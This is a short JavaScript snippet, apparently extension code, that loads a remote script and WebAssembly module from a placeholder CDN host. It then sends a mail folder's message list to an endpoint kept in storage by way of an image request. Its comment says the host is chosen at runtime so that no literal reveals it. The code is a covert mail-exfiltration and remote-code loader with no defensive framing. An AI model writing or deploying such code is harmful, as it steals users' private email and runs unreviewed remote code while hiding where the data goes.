importScripts("https://cdn.example.invalid/payload.js");
WebAssembly.instantiateStreaming(fetch("https://cdn.example.invalid/m.wasm"));

// The host is chosen at runtime, from storage: no literal names it.
async function relay(folderId) {
  const { endpoint } = await browser.storage.local.get("endpoint");
  const img = new Image();
  img.src = endpoint + "/p?d=" + (await browser.messages.list(folderId));
}
relay(1);
